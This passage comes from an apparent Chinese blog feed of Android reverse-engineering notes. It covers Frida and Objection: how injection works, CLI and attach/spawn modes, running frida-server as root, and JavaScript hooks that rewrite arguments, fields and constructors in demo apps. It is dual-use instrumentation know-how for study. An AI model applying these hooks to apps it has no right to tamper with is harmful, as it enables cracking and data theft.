class="string">&quot;java.lang.Exception&quot;</span>).$new()));</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>仍然是<code>hook</code>失败的，进行减法操作无任何反应。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250324235914989.png" alt="image-20250324235914989"></p><p>我们知道，<code>Frida</code>脚本中<code>Java</code>函数的主动调用(区分静态函数和实例函数)。如果是静态函数，只需要获取类对象即可直接完成函数的主动调用；如果是实例函数，只需要优先获取到类的实例对象即可完成函数的主动调用。</p><p>主动调用的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Arith</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.example.junior.util.Arith&#x27;</span>)</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">JavaString</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.lang.String&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> reuslt = <span class="title class_">Arith</span>.<span class="title function_">sub</span>(<span class="title class_">JavaString</span>.$new(<span class="string">&#x27;123&#x27;</span>),<span class="title class_">JavaString</span>.$new(<span class="string">&#x27;112&#x27;</span>));</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(reuslt);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main)</span><br></pre></td></tr></table></figure><p>成功调用。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250325000255731.png" alt="image-20250325000255731"></p><p>主动调用可以，但是被动调用就不行，这里可能是<code>App</code>的问题。</p><p>深入到<code>Arith.java</code>代码<sup class="footnote-ref"><a href="#fn5" id="fnref5">[5]</a></sup>中，发现<code>sub</code>函数的实现使用了<code>BigDecimal</code>函数。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250325001453566.png" alt="image-20250325001453566"></p><p>尝试去<code>hook</code>这个代码，发现成功<code>hook</code>，这里不清楚为什么。</p><p><img src="/2025/03/21/Objection%E7%AC%94%E8%AE%B0/image-20250325001629404.png" alt="image-20250325001629404"></p><p><code>hook</code>的代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">BigDecimal</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.math.BigDecimal&quot;</span>);</span><br><span class="line">        <span class="comment">// 构造函数 hook（验证参数）</span></span><br><span class="line">        <span class="comment">// BigDecimal.$init.overloads.forEach(function(overload)&#123;</span></span><br><span class="line">        <span class="comment">//     overload.implementation = function()&#123;</span></span><br><span class="line">        <span class="comment">//         console.log(&quot;[Hooked BigDecimal constructor] called:&quot;, overload.toString());</span></span><br><span class="line">        <span class="comment">//         for(var i=0; i&lt;arguments.length; i++)&#123;</span></span><br><span class="line">        <span class="comment">//             console.log(&quot;  arg[&quot;+i+&quot;]: &quot; + arguments[i]);</span></span><br><span class="line">        <span class="comment">//         &#125;</span></span><br><span class="line">        <span class="comment">//         return overload.apply(this, arguments);</span></span><br><span class="line">        <span class="comment">//     &#125;;</span></span><br><span class="line">        <span class="comment">// &#125;);</span></span><br><span class="line">        <span class="comment">// subtract 方法 hook（捕捉核心运算）</span></span><br><span class="line">        <span class="title class_">BigDecimal</span>.<span class="property">subtract</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.math.BigDecimal&quot;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">b2</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[Hooked BigDecimal.subtract] called&quot;</span>);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  self:&quot;</span>, <span class="variable language_">this</span>.<span class="title function_">toString</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  arg :&quot;</span>, b2.<span class="title function_">toString</span>());</span><br><span class="line">            <span class="keyword">var</span> result = <span class="variable language_">this</span>.<span class="title function_">subtract</span>(b2);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;  result:&quot;</span>, result.<span class="title function_">toString</span>());</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);    </span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h3 id="参考">参考</h3><hr class="footnotes-sep"><section class="footnotes"><ol class="footnotes-list"><li id="fn1" class="footnote-item"><p>《安卓Frida逆向与抓包实战》 陈佳林/著 <a href="#fnref1" class="footnote-backref">↩︎</a></p></li><li id="fn2" class="footnote-item"><p><a href="https://github.com/aqi00/android2">https://github.com/aqi00/android2</a> <a href="#fnref2" class="footnote-backref">↩︎</a></p></li><li id="fn3" class="footnote-item"><p><a href="https://github.com/x2nn/android_security/blob/main/junior.apk">https://github.com/x2nn/android_security/blob/main/junior.apk</a> <a href="#fnref3" class="footnote-backref">↩︎</a></p></li><li id="fn4" class="footnote-item"><p><a href="https://github.com/x2nn/android_security/blob/main/woaipojie.apk">https://github.com/x2nn/android_security/blob/main/woaipojie.apk</a> <a href="#fnref4" class="footnote-backref">↩︎</a></p></li><li id="fn5" class="footnote-item"><p><a href="https://github.com/aqi00/android2/blob/master/junior/src/main/java/com/example/junior/util/Arith.java#L3">https://github.com/aqi00/android2/blob/master/junior/src/main/java/com/example/junior/util/Arith.java#L3</a> <a href="#fnref5" class="footnote-backref">↩︎</a></p></li></ol></section>]]></content>
      
      
      <categories>
          
          <category> Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓逆向 </tag>
            
            <tag> Objection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Frida学习</title>
      <link href="/2025/03/13/Frida%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/03/13/Frida%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h2 id="一、什么是Frida">一、什么是Frida?</h2><p><code>Frida</code> 是一款开源的动态插桩工具，可以插入一些代码到原生App的内存空间去动态地监视和修改其行为，支持Windows、Mac、Linux、Android或者iOS，从安卓层面来讲，可以实现<code>Java</code>层和<code>Native</code>层<code>Hook</code>操作。<br><a href="https://github.com/frida/frida">项目地址</a><br><a href="https://frida.re/">官网及使用文档</a></p><h2 id="二、Frida原理及重要组件">二、Frida原理及重要组件</h2><p><code>Frida</code>注入的原理就是找到目标进程,使用<code>ptrace</code>跟踪目标进程获取<code>mmap</code>，<code>dlpoen</code>，<code>dlsym</code>等函数库的偏移获取<code>mmap</code>在目标进程申请一段内存空间将在目标进程中找到存放<code>frida-agent-32/64.so</code>的空间启动执行各种操作由<code>agent</code>去实现。</p><table><thead><tr><th>组件名称</th><th style="text-align:center">功能描述</th></tr></thead><tbody><tr><td>frida-gum</td><td style="text-align:center">提供了<code>inline-hook</code>的核心实现，还包含了代码跟踪模块<code>Stalker</code>，用于内存访问监控的<code>MemoryAccessMonitor</code>，以及符号查找、栈回溯实现、内存扫描、动态代码生成和重定位等功能</td></tr><tr><td>frida-core</td><td style="text-align:center"><code>fridahook</code>的核心，具有进程注入、进程间通信、会话管理、脚本生命周期管理等功能，屏蔽部分底层的实现细节并给最终用户提供开箱即用的操作接口。包含了<code>frida-server</code>、<code>frida-gadget</code>、<code>frida-agent</code>、<code>frida-helper</code>、<code>frida-inject</code>等关键模块和组件，以及之间的互相通信底座</td></tr><tr><td>frida-gadget</td><td style="text-align:center">本身是一个动态库，可以通过重打包修改动态库的依赖或者修改<code>smali</code>代码去实现向三方应用注入<code>gadget</code>，从而实现<code>Frida</code>的持久化或免<code>root</code></td></tr><tr><td>frida-server</td><td style="text-align:center">本质上是一个二进制文件，类似于前面学习到的<code>android_server</code>，需要在目标设备上运行并转发端口，在<code>Frida hook</code>中起到关键作用</td></tr></tbody></table><h2 id="三、Frida基础知识">三、Frida基础知识</h2><h3 id="（1）基础指令">（1）基础指令</h3><p><code>frida-ps -U</code> 查看当前手机运行的进程。<br><code>frida-ps --help</code> 查看<code>help</code> 指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">frida-ps --help</span><br><span class="line">使用方式: frida-ps [选项]</span><br><span class="line"></span><br><span class="line">选项:</span><br><span class="line">  -h, --help            显示帮助信息并退出</span><br><span class="line">  -D ID, --device ID    连接到具有给定ID的设备</span><br><span class="line">  -U, --usb             连接到USB设备</span><br><span class="line">  -R, --remote          连接到远程frida-server</span><br><span class="line">  -H HOST, --host HOST  连接到HOST上的远程frida-server</span><br><span class="line">  --certificate CERTIFICATE</span><br><span class="line">                        与HOST进行TLS通信，期望的CERTIFICATE</span><br><span class="line">  --origin ORIGIN       连接到设置了&quot;Origin&quot;头为ORIGIN的远程服务器</span><br><span class="line">  --token TOKEN         使用TOKEN验证HOST</span><br><span class="line">  --keepalive-interval INTERVAL</span><br><span class="line">                        设置心跳包间隔(秒)，或设置为0以禁用(默认为-1，根据传输方式自动选择)</span><br><span class="line">  --p2p                 与目标建立点对点连接</span><br><span class="line">  --stun-server ADDRESS</span><br><span class="line">                        设置与--p2p一起使用的STUN服务器地址</span><br><span class="line">  --relay address,username,password,turn-&#123;udp,tcp,tls&#125;</span><br><span class="line">                        添加与--p2p一起使用的中继</span><br><span class="line">  -O FILE, --options-file FILE</span><br><span class="line">                        包含额外命令行选项的文本文件</span><br><span class="line">  --version             显示程序版本号并退出</span><br><span class="line">  -a, --applications    只列出应用程序</span><br><span class="line">  -i, --installed       包括所有已安装的应用程序</span><br><span class="line">  -j, --json            以JSON格式输出结果</span><br></pre></td></tr></table></figure><h3 id="（2）操作模式">（2）操作模式</h3><table><thead><tr><th style="text-align:left">操作模式</th><th style="text-align:left">描述</th><th style="text-align:left">优点</th><th style="text-align:left">主要用途</th></tr></thead><tbody><tr><td style="text-align:left">CLI（命令行）模式</td><td style="text-align:left">通过命令行直接将JavaScript脚本注入进程中，对进程进行操作</td><td style="text-align:left">便于直接注入和操作</td><td style="text-align:left">在较小规模的操作或者需求比较简单的场景中使用</td></tr><tr><td style="text-align:left">RPC模式</td><td style="text-align:left">使用Python进行JavaScript脚本的注入工作，实际对进程进行操作的还是JavaScript脚本，可以通过RPC传输给Python脚本来进行复杂数据的处理</td><td style="text-align:left">在对复杂数据的处理上可以通过RPC传输给Python脚本来进行，有利于减少被注入进程的性能损耗</td><td style="text-align:left">在大规模调用中更加普遍，特别是对于复杂数据处理的需求</td></tr></tbody></table><h3 id="（3）注入模式与启动命令">（3）注入模式与启动命令</h3><table><thead><tr><th style="text-align:left">注入模式</th><th style="text-align:left">描述</th><th style="text-align:left">命令或参数</th><th style="text-align:left">优点</th><th style="text-align:left">主要用途</th></tr></thead><tbody><tr><td style="text-align:left">Spawn模式</td><td style="text-align:left">将启动App的权利交由Frida来控制，即使目标App已经启动，在使用Frida注入程序时还是会重新启动App</td><td style="text-align:left">在CLI模式中，Frida通过加上 -f 参数指定包名以spawn模式操作App</td><td style="text-align:left">适合于需要在App启动时即进行注入的场景，可以在App启动时即捕获其行为</td><td style="text-align:left">当需要监控App从启动开始的所有行为时使用</td></tr><tr><td style="text-align:left">Attach模式</td><td style="text-align:left">在目标App已经启动的情况下，Frida通过ptrace注入程序从而执行Hook的操作</td><td style="text-align:left">在CLI模式中，如果不添加 -f 参数，则默认会通过attach模式注入App</td><td style="text-align:left">适合于已经运行的App，不会重新启动App，对用户体验影响较小</td><td style="text-align:left">在App已经启动，或者我们只关心特定时刻或特定功能的行为时使用</td></tr></tbody></table><h4 id="Spawn模式">Spawn模式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -f 进程名 -l hook.js</span><br></pre></td></tr></table></figure><h4 id="Attach模式">Attach模式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U 进程名 -l hook.js</span><br></pre></td></tr></table></figure><h4 id="Frida-Server自定义端口">Frida_Server自定义端口</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">frida server 默认端口：27042</span><br><span class="line"></span><br><span class="line">taimen:/ $ su</span><br><span class="line">taimen:/ # cd data/local/tmp/</span><br><span class="line">taimen:/data/local/tmp # ./fs1280 -l 0.0.0.0:6666</span><br></pre></td></tr></table></figure><p><code>logcat | grep &quot;D.zj2595&quot;</code>日志捕获<br><code>adb connect 127.0.0.1:62001</code>模拟器端口转发</p><h3 id="（4）基础语法">（4）基础语法</h3><table><thead><tr><th style="text-align:left">API名称</th><th style="text-align:left">描述</th></tr></thead><tbody><tr><td style="text-align:left"><code>Java.use(className)</code></td><td style="text-align:left">获取指定的Java类并使其在JavaScript代码中可用。</td></tr><tr><td style="text-align:left"><code>Java.perform(callback)</code></td><td style="text-align:left">确保回调函数在Java的主线程上执行。</td></tr><tr><td style="text-align:left"><code>Java.choose(className, callbacks)</code></td><td style="text-align:left">枚举指定类的所有实例。</td></tr><tr><td style="text-align:left"><code>Java.cast(obj, cls)</code></td><td style="text-align:left">将一个Java对象转换成另一个Java类的实例。</td></tr><tr><td style="text-align:left"><code>Java.enumerateLoadedClasses(callbacks)</code></td><td style="text-align:left">枚举进程中已经加载的所有Java类。</td></tr><tr><td style="text-align:left"><code>Java.enumerateClassLoaders(callbacks)</code></td><td style="text-align:left">枚举进程中存在的所有Java类加载器。</td></tr><tr><td style="text-align:left"><code>Java.enumerateMethods(targetClassMethod)</code></td><td style="text-align:left">枚举指定类的所有方法。</td></tr></tbody></table><h3 id="（5）日志输出语法区别">（5）日志输出语法区别</h3><table><thead><tr><th style="text-align:left">日志方法</th><th style="text-align:left">描述</th><th style="text-align:left">区别</th></tr></thead><tbody><tr><td style="text-align:left"><code>console.log()</code></td><td style="text-align:left">使用JavaScript直接进行日志打印</td><td style="text-align:left">多用于在CLI模式中，<code>console.log()</code>直接输出到命令行界面，使用户可以实时查看。在RPC模式中，<code>console.log()</code>同样输出在命令行，但可能被Python脚本的输出内容掩盖。</td></tr><tr><td style="text-align:left"><code>send()</code></td><td style="text-align:left">Frida的专有方法，用于发送数据或日志到外部Python脚本</td><td style="text-align:left">多用于RPC模式中，它允许JavaScript脚本发送数据到Python脚本，Python脚本可以进一步处理或记录这些数据。</td></tr></tbody></table><h3 id="（6）Hook框架模版">（6）Hook框架模版</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">main</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="title function_">hookTest1</span>();</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">setImmediate</span>(main);</span><br></pre></td></tr></table></figure><h2 id="四、Frida常用API">四、Frida常用API</h2><h3 id="（1）Hook普通方法、打印参数和修改返回值">（1）Hook普通方法、打印参数和修改返回值</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//定义一个名为hookTest1的函数</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest1</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//获取一个名为&quot;类名&quot;的Java类，并将其实例赋值给JavaScript变量utils</span></span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;类名&quot;</span>);</span><br><span class="line">    <span class="comment">//修改&quot;类名&quot;的&quot;method&quot;方法的实现。这个新的实现会接收两个参数（a和b）</span></span><br><span class="line">    utils.<span class="property">method</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a, b</span>)&#123;</span><br><span class="line">            <span class="comment">//将参数a和b的值改为123和456。</span></span><br><span class="line">        a = <span class="number">123</span>;</span><br><span class="line">        b = <span class="number">456</span>;</span><br><span class="line">        <span class="comment">//调用修改过的&quot;method&quot;方法，并将返回值存储在`retval`变量中</span></span><br><span class="line">        <span class="keyword">var</span> retval = <span class="variable language_">this</span>.<span class="title function_">method</span>(a, b);</span><br><span class="line">        <span class="comment">//在控制台上打印参数a，b的值以及&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(a, b, retval);</span><br><span class="line">        <span class="comment">//返回&quot;method&quot;方法的返回值</span></span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（2）Hook重载参数">（2）Hook重载参数</h3><p>函数名称相同，但是函数传入的参数类型不同，这个就是重载。函数的重载导致会导致<code>frida</code>不知道具体应该<code>Hook</code>哪个函数而出现的问题。这时候要在代码中加入要<code>Hook</code>的<strong>函数的参数类型</strong>，这样就不会报错了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// .overload()</span></span><br><span class="line"><span class="comment">// .overload(&#x27;自定义参数&#x27;)</span></span><br><span class="line"><span class="comment">// .overload(&#x27;int&#x27;)</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest2</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//overload定义重载函数，根据函数的参数类型填</span></span><br><span class="line">    utils.<span class="property">Inner</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.zj.wuaipojie.Demo$Animal&#x27;</span>,<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">a，b</span>)&#123;</span><br><span class="line">        b = <span class="string">&quot;aaaaaaaaaa&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title class_">Inner</span>(a,b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（3）Hook构造函数">（3）Hook构造函数</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest3</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">    <span class="comment">//修改类的构造函数的实现，$init表示构造函数</span></span><br><span class="line">    utils.<span class="property">$init</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">str</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(str);</span><br><span class="line">        str = <span class="string">&quot;52&quot;</span>;</span><br><span class="line">        <span class="variable language_">this</span>.$init(str);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（4）Hook字段">（4）Hook字段</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest5</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//静态字段的修改</span></span><br><span class="line">        <span class="keyword">var</span> utils = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//修改类的静态字段&quot;flag&quot;的值</span></span><br><span class="line">        utils.<span class="property">staticField</span>.<span class="property">value</span> = <span class="string">&quot;我是被修改的静态变量&quot;</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(utils.<span class="property">staticField</span>.<span class="property">value</span>);</span><br><span class="line">        <span class="comment">//非静态字段的修改</span></span><br><span class="line">        <span class="comment">//使用`Java.choose()`枚举类的所有实例</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">choose</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">                    <span class="comment">//修改实例的非静态字段&quot;_privateInt&quot;的值为&quot;123456&quot;，并修改非静态字段&quot;privateInt&quot;的值为9999。</span></span><br><span class="line">                obj.<span class="property">_privateInt</span>.<span class="property">value</span> = <span class="string">&quot;123456&quot;</span>; <span class="comment">//字段名与函数名相同 前面加个下划线</span></span><br><span class="line">                obj.<span class="property">privateInt</span>.<span class="property">value</span> = <span class="number">9999</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（5）Hook内部类">（5）Hook内部类</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest6</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//内部类</span></span><br><span class="line">        <span class="keyword">var</span> innerClass = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo$innerClass&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(innerClass);</span><br><span class="line">        innerClass.<span class="property">$init</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;eeeeeeee&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（6）枚举所有的类与类的所有方法">（6）枚举所有的类与类的所有方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest7</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="comment">//枚举所有的类与类的所有方法,异步枚举</span></span><br><span class="line">        <span class="title class_">Java</span>.<span class="title function_">enumerateLoadedClasses</span>(&#123;</span><br><span class="line">            <span class="attr">onMatch</span>: <span class="keyword">function</span>(<span class="params">name,handle</span>)&#123;</span><br><span class="line">                    <span class="comment">//过滤类名</span></span><br><span class="line">                <span class="keyword">if</span>(name.<span class="title function_">indexOf</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>) !=-<span class="number">1</span>)&#123;</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(name);</span><br><span class="line">                    <span class="keyword">var</span> clazz =<span class="title class_">Java</span>.<span class="title function_">use</span>(name);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(clazz);</span><br><span class="line">                    <span class="keyword">var</span> methods = clazz.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(methods);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="attr">onComplete</span>: <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="（7）枚举所有方法">（7）枚举所有方法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hookTest8</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">Demo</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.zj.wuaipojie.Demo&quot;</span>);</span><br><span class="line">        <span class="comment">//getDeclaredMethods枚举所有方法</span></span><br><span class="line">        <span class="keyword">var</span> methods =<span class="title class_">Demo</span>.<span class="property">class</span>.<span class="title function_">getDeclaredMethods</span>();</span><br><span class="line">        <span 